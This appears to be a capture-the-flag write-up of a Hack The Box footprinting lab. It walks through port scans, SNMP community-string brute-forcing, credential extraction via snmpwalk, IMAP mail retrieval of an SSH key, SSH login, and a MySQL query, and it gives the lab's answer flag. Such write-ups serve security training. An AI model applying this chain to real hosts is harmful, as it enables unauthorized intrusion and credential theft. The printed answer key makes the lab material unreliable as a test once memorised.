# Footprinting Lab — Hard

## Scenario

The **third** server is an **MX and management server** for the internal network, also acting as a **backup server** for internal domain accounts. A user named **HTB** was created here, and we need its credentials.

- **Target:** `10.129.3.149` (hostname `NIXHARD`)

> **Objective:** Find the user `HTB` and submit its password.
> **Answer:** `cr3n4o7rzse7rzhnckhssncif7ds`
>
> **Credential chain discovered along the way:**
> - SNMP community string: `backup`
> - `tom:NMds732Js2761` (leaked via SNMP)
> - `tom`'s SSH private key (leaked via IMAP email)

---

## Step 1 — TCP Port Scan

```text
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
110/tcp open  pop3      Dovecot pop3d   (cert commonName=NIXHARD)
143/tcp open  imap      Dovecot imapd   (cert commonName=NIXHARD)
993/tcp open  ssl/imap  Dovecot imapd
995/tcp open  ssl/pop3  Dovecot pop3d
```

The mail services (POP3/IMAP) require authentication, and the certificate leaks the hostname **NIXHARD**. With nothing immediately usable on TCP, pivot to **UDP**.

## Step 2 — UDP Scan Reveals SNMP

```text
$ sudo nmap -sU -sV -F 10.129.3.149

PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    net-snmp SNMPv3 server
```

> Port **161/udp (SNMP)** is open — a frequent source of leaked information.

## Step 3 — Brute-Force the SNMP Community String

```shell
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.3.149

10.129.3.149 [backup] Linux NIXHARD 5.4.0-90-generic ... x86_64
```

> **Recovered community string:** `backup`

## Step 4 — Walk SNMP for Secrets

```shell
$ snmpwalk -c backup -v2c 10.129.3.149
...
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
...
```

> The **running-software OID tree** (`.1.3.6.1.2.1.25.1.7`) exposes a process running with credentials as arguments.
> **Recovered:** `tom:NMds732Js2761`

## Step 5 — Log Into IMAP and Read Tom's Mail

Connect to the encrypted IMAP port and authenticate as `tom`:

```text
$ openssl s_client 10.129.3.149:993
1 LOGIN tom NMds732Js2761
1 OK ... Logged in
1 LIST "" *
* LIST ... "." INBOX
1 SELECT INBOX
1 FETCH 1 BODY[]
```

The single inbox message contains an email with an **OpenSSH private key** pasted into the body:

```text
Subject: KEY
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ...
...AAAAt0b21ATklYSEFSRAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

> **Decoding the key comment:** the trailing base64 `dG9tQE5JWEhBUkQ` decodes to `tom@NIXHARD`, confirming this key belongs to **tom**.

## Step 6 — SSH In with the Recovered Key

```shell
$ nano tom_id_rsa          # paste the full key block
$ chmod 600 tom_id_rsa
$ ssh -i tom_id_rsa tom@10.129.3.149
...
tom@NIXHARD:~$
```

## Step 7 — Query MySQL for the HTB User

Tom's password (`NMds732Js2761`, from SNMP) also works for MySQL:

```sql
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |   <- non-default
+--------------------+

mysql> use users
mysql> select username,password from users where username='HTB';
+----------+------------------------------+
| username | password                     |
+----------+------------------------------+
| HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+----------+------------------------------+
```

---

## Takeaways

- When TCP yields nothing usable, **scan UDP** — SNMP on 161/udp was the whole key to this box.
- SNMP's running-process OIDs frequently leak **credentials passed as command-line arguments**.
- The same password (`tom`'s) was reused across **SNMP-leaked process, IMAP, and MySQL** — reinforcing the credential-reuse theme from the Medium lab.
- A private key can hide anywhere — even pasted into an email body retrievable over IMAP.
